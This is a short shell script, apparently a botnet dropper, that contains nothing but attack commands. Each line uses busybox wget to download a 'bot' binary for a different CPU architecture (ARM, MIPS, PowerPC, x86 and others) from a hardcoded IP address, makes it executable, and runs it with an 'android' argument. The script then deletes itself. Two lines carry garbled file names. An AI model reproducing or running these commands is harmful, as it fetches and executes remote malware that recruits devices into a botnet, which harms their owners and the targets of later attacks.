busybox wget http://74.201.28.102/bins/bot.arm; chmod 777 bot.arm; ./bot.arm android
busybox wget http://74.201.28.102/bins/bot.arm5; chmod 777 bot.arm5; ./bot.arm5 android
busybox wget http://74.201.28.102/bins/bot.arm6; chmod 777 bot.arm6; ./bot.arm6 android
busybox wget http://74.201.28.102/bins/bot.arm7; chmod 777 bot.arm7; ./bot.arm7 android
busybox wget http://74.201.28.102/bins/bot.m68k; chmod 777 bot.m68k; ./bot.m68k android
busybox wget http://74.201.28.102/bins/bot.mips; chmod 777 bot.mips; ./bot.mips android
busybox wget http://74.201.28.102/bins/bot.mpsl; chmod 777 mpsl; ./bot.mpsl android
busybox wget http://74.201.28.102/bins/bot.ppc; chmod 777 bot.pbot.pc; ./bot.ppc android
busybox wget http://74.201.28.102/bins/bot.sh4; chmod 777 bot.sh4; ./bot.sh4 android
busybox wget http://74.201.28.102/bins/bot.spc; chmod 777 bot.spc; ./bot.spc android
busybox wget http://74.201.28.102/bins/bot.x86; chmod 777 bot.x86; ./bot.x86 android
busybox wget http://74.201.28.102/bins/bot.x86_64; chmod 777 bot.x86_64; ./bot.x86_64 android

rm $0